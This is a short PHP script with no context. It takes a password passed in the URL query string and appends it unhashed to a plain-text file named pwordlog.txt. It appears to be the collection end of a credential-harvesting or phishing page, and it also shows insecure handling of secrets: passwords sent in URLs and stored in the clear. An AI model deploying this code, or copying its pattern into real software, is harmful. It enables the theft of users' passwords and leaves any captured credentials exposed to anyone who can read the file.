<?php
if(!empty($_GET['password'])) {
    $logfile = fopen('pwordlog.txt', 'a+');
    fwrite($logfile, $_GET['password']);
    fclose($logfile);
}
?>
